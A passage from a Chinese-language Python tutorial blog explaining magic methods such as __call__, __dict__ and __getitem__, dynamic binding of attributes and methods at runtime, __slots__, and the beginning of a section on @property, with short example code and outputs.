class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="call"><a href="#call" class="headerlink" title="__call__"></a><code>__call__</code></h2><ul><li>对象后面加括号，触发执行。就是把一个类当函数使用，并且支持传递参数</li></ul><p>注：<code>__init__</code>方法的执行是由创建对象触发的，即：<code>对象 = 类名()</code> ；而对于 <code>__call__</code> 方法的执行是由对象后加括号触发的，即：<code>对象()</code> 或者 <code>类()()</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;__call__如果对类实例化之后添加了括号则会执行当前方法&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = Foo()  <span class="comment"># 执行 __init__，实例化的过程</span></span><br><span class="line">obj()  <span class="comment"># 执行 __call__方法</span></span><br><span class="line">Foo()()<span class="comment">#直接执行 __call__方法</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name, self.age)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        address = args</span><br><span class="line">        <span class="built_in">print</span>(address)</span><br><span class="line">        <span class="comment"># return self.name, self.age</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当对当前的实例对象进行括号调用时打印人物信息</span></span><br><span class="line">p = Person(<span class="string">&#x27;双双&#x27;</span>, <span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把实例对象当成一个函数去使用</span></span><br><span class="line">p(<span class="string">&#x27;长沙&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数可以接受参数</span></span><br></pre></td></tr></table></figure><h2 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a><code>__dict__</code></h2><ul><li>类或对象中的所有属性</li></ul><p>类的实例属性属于对象；类中的类属性和方法等属于类，即：</p><blockquote><p><code>__dict__</code>和<code>dir()</code>的区别：dir仅能获取到属性和方法的名字，但是dict可以详细的获取到属性的值以及方法的详细信息</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Province</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    country = <span class="string">&#x27;China&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, count</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.count = count</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;func&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取类的属性，即：类属性、方法、</span></span><br><span class="line"><span class="built_in">print</span>(Province.__dict__)</span><br><span class="line"><span class="comment"># 输出：&#123;&#x27;__dict__&#x27;: &lt;attribute &#x27;__dict__&#x27; of &#x27;Province&#x27; objects&gt;, &#x27;__module__&#x27;: &#x27;__main__&#x27;, &#x27;country&#x27;: &#x27;China&#x27;, &#x27;__doc__&#x27;: None, &#x27;__weakref__&#x27;: &lt;attribute &#x27;__weakref__&#x27; of &#x27;Province&#x27; objects&gt;, &#x27;func&#x27;: &lt;function Province.func at 0x101897950&gt;, &#x27;__init__&#x27;: &lt;function Province.__init__ at 0x1018978c8&gt;&#125;</span></span><br><span class="line"></span><br><span class="line">obj1 = Province(<span class="string">&#x27;山东&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="built_in">print</span>(obj1.__dict__)</span><br><span class="line"><span class="comment"># 获取 对象obj1 的属性</span></span><br><span class="line"><span class="comment"># 输出：&#123;&#x27;count&#x27;: 10000, &#x27;name&#x27;: &#x27;山东&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line">obj2 = Province(<span class="string">&#x27;山西&#x27;</span>, <span class="number">20000</span>)</span><br><span class="line"><span class="built_in">print</span>(obj2.__dict__)</span><br><span class="line"><span class="comment"># 获取 对象obj1 的属性</span></span><br><span class="line"><span class="comment"># 输出：&#123;&#x27;count&#x27;: 20000, &#x27;name&#x27;: &#x27;山西&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="str"><a href="#str" class="headerlink" title="__str__"></a><code>__str__</code></h2><ul><li>如果一个类中定义了<code>__str__</code>方法，那么在打印对象时，默认输出该方法的返回值。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;双双&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = Foo()</span><br><span class="line"><span class="built_in">print</span>(obj)</span><br><span class="line"><span class="comment"># 输出：双双</span></span><br></pre></td></tr></table></figure><h2 id="getitem-、-setitem-、-delitem"><a href="#getitem-、-setitem-、-delitem" class="headerlink" title="__getitem__、__setitem__、__delitem__"></a><code>__getitem__</code>、<code>__setitem__</code>、<code>__delitem__</code></h2><ul><li>用于索引操作，如字典。以上分别表示获取、设置、删除数据</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, item</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;__getitem__被调用&#x27;</span>, item)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, key, value</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;__setitem__被调用&#x27;</span>, key, value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__delitem__</span>(<span class="params">self, key</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;__delitem__被调用&#x27;</span>, key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foo = Foo()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在当前这个实例对象中创建一个字典key</span></span><br><span class="line">res = foo[<span class="string">&#x27;name&#x27;</span>]        <span class="comment"># 自动触发执行 __getitem__</span></span><br><span class="line">foo[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;安娜&#x27;</span>      <span class="comment"># 自动触发执行 __setitem__</span></span><br><span class="line"><span class="keyword">del</span> foo[<span class="string">&#x27;name&#x27;</span>]         <span class="comment"># 自动触发执行 __delitem__</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="动态绑定"><a href="#动态绑定" class="headerlink" title="动态绑定"></a>动态绑定</h1><blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">动态与静态的定义</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    动态:</span></span><br><span class="line"><span class="string">        动态语言无需编译，在程序执行过程由解释器进行代码转义[py - 字节码]</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    静态：</span></span><br><span class="line"><span class="string">        需要使用编译器进行编译, c++ gcc 在执行前需要使用编译器进行编译转为字节码再由cpu进行执行</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    因为动态语言在执行时需要通过解释器进行一行一行的翻译 在翻译的过程中我可以进行代码修改</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="动态语言的定义"><a href="#动态语言的定义" class="headerlink" title="动态语言的定义"></a>动态语言的定义</h2><p>动态编程语言 是 高级程序设计语言 的一个类别，在计算机科学领域已被广泛应用。它是一类 在运行时可以改变其结构的语言</p><p>例如：新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。</p><p>动态语言目前非常具有活力。例如<code>Python</code>便是一个动态语言，除此之外如 <code>PHP</code> 、 <code>Ruby</code> 、 <code>JavaScript</code> 等也都属于动态语言，而 <code>C语言</code> 、<code> C++</code> 等语言则不属于动态语言。</p><h2 id="给实例对象添加属性的两种方式"><a href="#给实例对象添加属性的两种方式" class="headerlink" title="给实例对象添加属性的两种方式"></a>给实例对象添加属性的两种方式</h2><blockquote><ul><li>使用实例对象去创建属性: 当前属性是实例属性 不共享</li><li>使用类去创建属性：类属性，共享的</li></ul></blockquote><h2 id="在运行中给实例对象绑定（添加）属性"><a href="#在运行中给实例对象绑定（添加）属性" class="headerlink" title="在运行中给实例对象绑定（添加）属性"></a>在运行中给实例对象绑定（添加）属性</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name=<span class="literal">None</span>, age=<span class="literal">None</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = Person(<span class="string">&quot;安娜&quot;</span>, <span class="string">&quot;20&quot;</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>在这里，我们定义了一个类<code>Person</code>，在这个类里，定义了两个初始属性<code>name</code>和<code>age</code>，但是人还有性别啊！如果这个类不是你写的是不是你会尝试访问性别这个属性呢？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.sex = <span class="string">&quot;女&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.sex</span><br><span class="line"><span class="string">&#x27;女&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>这时候就发现问题了，我们定义的类里面没有<code>sex</code>这个属性啊！怎么回事呢？ 这就是动态语言的魅力和坑！</p><p>这里实际上就是<strong>动态给实例绑定属性</strong>！</p><h2 id="在运行中给类绑定（添加）属性"><a href="#在运行中给类绑定（添加）属性" class="headerlink" title="在运行中给类绑定（添加）属性"></a>在运行中给类绑定（添加）属性</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p1 = Person(<span class="string">&quot;双双&quot;</span>, <span class="string">&quot;25&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p1.sex</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;pyshell#21&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    p1.sex</span><br><span class="line">AttributeError: Person instance has no attribute <span class="string">&#x27;sex&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>我们尝试打印<code>p1.sex</code>，发现报错，<code>p1</code>没有<code>sex</code>这个属性！—— 给<code>p</code>这个实例绑定属性对<code>p1</code>这个实例不起作用！ 那我们要给所有的<code>Person</code>的所有实例加上 <code>sex</code>属性怎么办呢？</p><p>答案就是直接给<code>Person</code>类绑定属性！</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;&gt; Person.sex = <span class="literal">None</span>  <span class="comment"># 给类Person添加一个属性</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p2 = Person(<span class="string">&quot;双双&quot;</span>, <span class="string">&quot;25&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(p2.sex)  <span class="comment"># 如果p2这个实例对象中没有sex属性的话，那么就会访问它的类属性</span></span><br><span class="line"><span class="literal">None</span>  <span class="comment"># 可以看到没有出现异常</span></span><br><span class="line">&gt;&gt;&gt;<span class="comment"># 动态删除属性</span></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">del</span> Person.sex</span><br></pre></td></tr></table></figure><h2 id="运行中给实例对象绑定（添加）方法"><a href="#运行中给实例对象绑定（添加）方法" class="headerlink" title="运行中给实例对象绑定（添加）方法"></a>运行中给实例对象绑定（添加）方法</h2><p>我们直接给<code>Person</code>绑定<code>sex</code>这个属性，然后实例化<code>p2</code>后，<code>p2</code>就有<code>sex</code>这个属性了！ 那么方法呢？怎么绑定？</p><blockquote><p>MethodType：可以动态的给一个类添加实例方法</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name=<span class="literal">None</span>, age=<span class="literal">None</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;eat food&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, speed</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s在移动, 速度是%dkm/h&quot;</span> % (self.name, speed))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p3 = Person(<span class="string">&quot;夏洛&quot;</span>, <span class="number">24</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p3.eat()</span><br><span class="line">eat food</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p3.run()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;pyshell#5&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    p3.run()</span><br><span class="line">AttributeError: Person instance has no attribute <span class="string">&#x27;run&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> types</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p3.run = types.MethodType(run, p3)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p3.run(<span class="number">180</span>)</span><br><span class="line">夏洛在移动,速度是180km/h</span><br></pre></td></tr></table></figure><blockquote><p>为什么实例方法不能直接赋值绑定呢？</p><p>  因为实例方法有访问权限,类对象无权访问实例属性，所以需要使用MethodType进行绑定</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;self.name&#125;</span>, <span class="subst">&#123;self.age&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 类对象无权访问实例属性</span></span><br><span class="line">p = Person(<span class="string">&#x27;安娜&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不是类对象有访问权限，而是通过方法访问属性</span></span><br><span class="line">Person.info(p)</span><br></pre></td></tr></table></figure><h2 id="运行中给类绑定（添加）方法"><a href="#运行中给类绑定（添加）方法" class="headerlink" title="运行中给类绑定（添加）方法"></a>运行中给类绑定（添加）方法</h2><blockquote><p>对于给类对象添加静态方法和类方法很简单，就跟给类绑定属性一样~~</p><p>参考下面的例子：</p></blockquote><h2 id="完整代码示例"><a href="#完整代码示例" class="headerlink" title="完整代码示例"></a>完整代码示例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义了一个类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name = <span class="literal">None</span>, age = <span class="literal">None</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;---默认的实例方法---&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个实例方法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, speed</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----实例方法--1--&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s在移动, 速度是 %d km/h&quot;</span>%(self.name, speed))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----实例方法--2--&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个类方法</span></span><br><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_class</span>(<span class="params">cls</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----类方法--1--&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num=%d&quot;</span> % cls.num)</span><br><span class="line">    cls.num = <span class="number">100</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num=%d&quot;</span> % cls.num)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----类方法--2--&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个静态方法</span></span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_static</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----静态方法--1--&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;---static method----&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----静态方法--2--&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个实例对象</span></span><br><span class="line">p = Person(<span class="string">&quot;安娜&quot;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="comment"># 调用在class中的方法</span></span><br><span class="line">p.eat()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给这个对象添加实例方法</span></span><br><span class="line"><span class="comment"># MethodType：可以动态的给一个类添加实例方法</span></span><br><span class="line">p.run = types.MethodType(run, p)</span><br><span class="line"><span class="comment"># 调用实例方法</span></span><br><span class="line">p.run(<span class="number">180</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给Person类绑定类方法</span></span><br><span class="line">Person.test_class = test_class</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用类方法</span></span><br><span class="line">Person.test_class()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给Person类绑定静态方法</span></span><br><span class="line">Person.test_static = test_static</span><br><span class="line"><span class="comment"># 调用静态方法</span></span><br><span class="line">Person.test_static()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">方法是不是属性？</span></span><br><span class="line"><span class="string">    是</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">想要在一个类中添加一个属性</span></span><br><span class="line"><span class="string">    类名.属性名 = 值  # 动态赋值</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    类名.方法名 = 方法名  # 将我们自己定义的函数的引用地址复制给类中的一个变量 类属性</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    为什么实例方法不能直接赋值？</span></span><br><span class="line"><span class="string">        因为实例方法有访问权限，非实例不能访问</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">---默认的实例方法---</span><br><span class="line">----实例方法--1--</span><br><span class="line">安娜在移动, 速度是 180 km/h</span><br><span class="line">----实例方法--2--</span><br><span class="line">----类方法--1--</span><br><span class="line">num=0</span><br><span class="line">num=100</span><br><span class="line">----类方法--2--</span><br><span class="line">----静态方法--1--</span><br><span class="line">---static method----</span><br><span class="line">----静态方法--2--</span><br></pre></td></tr></table></figure><h2 id="在代码运行中删除属性与方法"><a href="#在代码运行中删除属性与方法" class="headerlink" title="在代码运行中删除属性与方法"></a>在代码运行中删除属性与方法</h2><p>删除的方法:</p><ol><li><code>del 对象.属性名</code></li><li><code>delattr(对象, &quot;属性名&quot;)</code></li></ol><h2 id="简单总结-2"><a href="#简单总结-2" class="headerlink" title="简单总结"></a>简单总结</h2><ol><li>Python可以在运行的过程中，修改程序的运行结构，例如可以修改调用的函数等</li><li>对象中其实一切皆属性，方法其实也是属性，只不过这个可以进行调用而已，例如 <code>实例对象名.属性名()</code></li><li>相对于动态语言，静态语言具有严谨性！所以，玩动态语言的时候，小心动态的坑！</li></ol><p>那么怎么避免这种情况呢？ 请使用<code>__slots__</code></p><h1 id="slots"><a href="#slots" class="headerlink" title="__slots__"></a><code>__slots__</code></h1><h2 id="动态语言的概念"><a href="#动态语言的概念" class="headerlink" title="动态语言的概念"></a>动态语言的概念</h2><p>现在我们终于明白了，动态语言与静态语言的不同</p><p>动态语言：可以在运行的过程中，修改代码</p><p>静态语言：编译时已经确定好代码，运行过程中不能修改</p><p>如果我们想要<strong>限制实例的属性</strong>怎么办？比如，只允许对<code>Person</code>实例添加<code>name</code>和<code>age</code>属性</p><h2 id="使用-slots-限制属性的创建"><a href="#使用-slots-限制属性的创建" class="headerlink" title="使用__slots__限制属性的创建"></a>使用<code>__slots__</code>限制属性的创建</h2><p>为了达到限制的目的，<code>Python</code>允许在定义类的时候，定义一个特殊的<code>__slots__</code>属性，来限制该类创建的实例对象可以添加的属性</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        __slots__ = (<span class="string">&quot;name&quot;</span>, <span class="string">&quot;age&quot;</span>)<span class="comment">#仅能添加name和age</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>P = Person()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>P.name = <span class="string">&quot;teacher&quot;</span>  <span class="comment"># 可以执行</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>P.age = <span class="number">20</span>  <span class="comment"># 可以执行</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>P.score = <span class="number">100</span>  <span class="comment"># 执行失败</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;pyshell#3&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: Person instance has no attribute <span class="string">&#x27;score&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="comment"># 定义方法</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    因为python是可以对类进行动态的属性创建</span></span><br><span class="line"><span class="string">        在项目开发中不能随意的去创建属性</span></span><br><span class="line"><span class="string">            __slots__：进行属性的创建限制</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        属性？  -&gt; 字符串</span></span><br><span class="line"><span class="string">        方法是不是属性？</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    __slots__ = (<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 当前方法不可以写在__init__中</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对当前这个类进行实例化</span></span><br><span class="line">p = Person()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用动态的方式进行属性的创建</span></span><br><span class="line">p.name = <span class="string">&#x27;安娜&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(p.name)</span><br><span class="line"></span><br><span class="line">p.age = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(p.age)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在当前__slots__方法中没有的属性</span></span><br><span class="line"><span class="comment"># p.address = &#x27;长沙&#x27;</span></span><br><span class="line"><span class="comment"># print(p.address)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person_2</span>(<span class="title class_ inherited__">Person</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = Person_2()</span><br><span class="line">p.name = <span class="string">&#x27;双双&#x27;</span></span><br><span class="line">p.age = <span class="number">20</span></span><br><span class="line">p.address = <span class="string">&#x27;南京&#x27;</span>  <span class="comment"># address这个属性并没有受到__slots__的影响</span></span><br><span class="line"><span class="built_in">print</span>(p.name, p.age, p.address)</span><br></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>使用<code>__slots__</code>要注意，<code>__slots__</code>定义的属性仅对当前类实例起作用，对继承的子类是不起作用的</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">67</span>]: <span class="keyword">class</span> <span class="title class_">Test</span>(<span class="title class_ inherited__">Person</span>):</span><br><span class="line">    ...:     <span class="keyword">pass</span></span><br><span class="line">    ...:</span><br><span class="line"></span><br><span class="line">In [<span class="number">68</span>]: t = Test()</span><br><span class="line"></span><br><span class="line">In [<span class="number">69</span>]: t.score = <span class="number">100</span></span><br></pre></td></tr></table></figure><h2 id="简单总结-3"><a href="#简单总结-3" class="headerlink" title="简单总结"></a>简单总结</h2><ol><li>为了限制随意给对象添加属性，可以使用<code>__slots__</code>来完成</li><li><code>__slots__</code>对子类不起作用</li></ol><h1 id="property属性"><a href="#property属性" class="headerlink" title="property属性"></a><code>property</code>属性</h1><blockquote><p>各大框架都会使用到</p></blockquote><h2 id="property"><a href="#property" class="headerlink" title="@property"></a>@property</h2><p>什么是property属性？</p><p>Python的property属性的功能是：<u>property属性内部进行一系列的逻辑计算，最终将计算结果返回。</u></p><p>一种用起来像是使用的实例属性一样的特殊属性，可以对应于某个方法。</p><p>主要用于拿到当前方法中<strong>计算的返回值</strong> ，就跟属性一样，拿到属性计算的结果</p><p>当不需要这种计算的时候，屏蔽注释掉property方法即可~~~</p><p>屏蔽这个方法不影响类的使用~~~~</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义property属性</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">prop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">      </span><br><span class="line">foo_obj = Foo()</span><br><span class="line">foo_obj.func()  <span class="comment"># 调用实例方法</span></span><br><span class="line">foo_obj.prop  <span class="comment"># 调用property属性</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Goods</span>:</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">money</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">goods = Goods()</span><br><span class="line"><span class="built_in">print</span>(goods.money)</span><br></pre></td></tr></table></figure><p>property属性的定义和调用要注意一下几点：</p><ul><li>定义时，在实例方法的基础上添加 @property 装饰器；并且仅有一个self参数</li><li>调用时，无需括号</li></ul><h2 id="简单的示例"><a href="#简单的示例" class="headerlink" title="简单的示例"></a>简单的示例</h2><p>对于京东商城中显示电脑主机的列表页面，每次请求不可能把数据库中的所有内容都显示到页面上，而是通过分页的功能局部显示，所以在向数据库中请求数据时就要显示的指定获取从第m条到第n条的所有数据 